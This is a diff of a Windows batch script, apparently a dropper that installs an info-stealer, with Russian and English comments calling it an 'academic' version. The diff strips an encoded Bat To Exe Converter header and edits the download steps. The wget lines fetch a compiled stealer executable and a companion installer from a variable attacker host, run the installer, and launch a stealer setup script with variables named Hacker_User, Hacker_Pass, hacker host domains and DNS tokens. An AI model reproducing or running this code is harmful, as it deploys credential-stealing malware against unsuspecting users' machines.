@@ -1,40 +1,3 @@
-::[Bat To Exe Converter]
-::
-::fBE1pAF6MU+EWGveyEs+LQ9EWQa+JX6+A7tS7/r64e6MrVcYWKwtbbP+wqSBLuUd/kTYfJg+wntWlPQ/GAJUewDlZwE9yQ==
-::fBE1pAF6MU+EWGveyEs+LQ9EWQa+JX6+A7tS7/r64e6MrVcYWKwtbbP+wqSBLuUd/kTYYpEowjRfgM5s
-::fBE1pAF6MU+EWGveyEs+LQ9EWQa+JX6+A7tS7/r64e6MrVcYWKwtbbP+wqSBLuUd/kTYXJg+wntWlPQ/GAJUewCDWjsE52xDogQ=
-::fBE1pAF6MU+EWGveyEs+LQ9EWQa+JX6+A7tS7/r64e6MrVcYWKwtbbP+wqSBLuUd/kTYfJg+wntWlOM4OCtnTQayYgomrWdRonaMNYmeshuB
-::YAwzoRdxOk+EWAnk
-::fBw5plQjdG8=
-::YAwzuBVtJxjWCl3EqQJgSA==
-::ZR4luwNxJguZRRnk
-::Yhs/ulQjdF+5
-::cxAkpRVqdFKZSDk=
-::cBs/ulQjdF+5
-::ZR41oxFsdFKZSTk=
-::eBoioBt6dFKZSDk=
-::cRo6pxp7LAbNWATEpSI=
-::egkzugNsPRvcWATEpSI=
-::dAsiuh18IRvcCxnZtBNQ
-::cRYluBh/LU+EWAnk
-::YxY4rhs+aU+JeA==
-::cxY6rQJ7JhzQF1fEqQJQ
-::ZQ05rAF9IBncCkqN+0xwdVs0
-::ZQ05rAF9IAHYFVzEqQJQ
-::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
-::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
-::cRolqwZ3JBvQF1fEqQJQ
-::dhA7uBVwLU+EWDk=
-::YQ03rBFzNR3SWATElA==
-::dhAmsQZ3MwfNWATElA==
-::ZQ0/vhVqMQ3MEVWAtB9wSA==
-::Zg8zqx1/OA3MEVWAtB9wSA==
-::dhA7pRFwIByZRRnk
-::Zh4grVQjdD2DJFCK8VYgPRloVRGGOWX0Aacd5uzw4PCCrgMPQd4aYJ/U1LGANOEv5krlcZ45wmpJjNIACQlnaBu4IAosrA4=
-::YB416Ek+ZW8=
-::
-::
-::978f952a14a936cc963da21a135fa983
 rem Файл загрузки и установки стайлера (Академический вариант)
 rem USAGE
 rem > load_distrib.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
@@ -109,17 +72,22 @@ rem Разрешаем все протоколы для wget.exe в брандмауэре
 rem Запускаем на выполнение команды WGET
 rem !!! Изменяемая величина! Проверять перед использованием !!!
 
+rem Поменять на имя своего файла скомпилированного стайлера (вместо ExponentaHTTPStealer.exe !!!)
+rem Change the name of Stealer compiled file (Instaed of ExponentaHTTPStealer.exe)
 wget %host%/ExponentaHTTPStealer.exe
-wget %host%/ThreadsSetup.exe
-wget %host%/ExponentaInstallerHttpHidden.exe
+
+rem Поменять путь и имя хоста, с которого скачивается инсталлятор nir environment !!!
+rem Change the hostname and path to downloaded file of nir ennvironment !!!
+wget %host%/nit-install.exe
+
 rem wget --http-user=%httpuser% -nc --http-passwd=%httppassword% %host%/chock.install.cmd
 rem wget -r --no-parent %host%/
 
 rem Запускаем инсталлятор Admin-Pack "Экспонента"
-ExponentaInstallerHttpHidden.exe
+%LocalFolderZ%\nit-install.exe
 
 rem Запускаем инсталлятор Stealer "Экспонента"
-call install_StylerHTTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %Hacker_httppref% %Hacker_httpport% %hldnstoken% %entrydnstoken%
+call %LocalFolderZ%\install_StylerHTTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %Hacker_httppref% %Hacker_httpport% %hldnstoken% %entrydnstoken%
 cd /d %curdir%
 
 rem Удаляем временный каталог
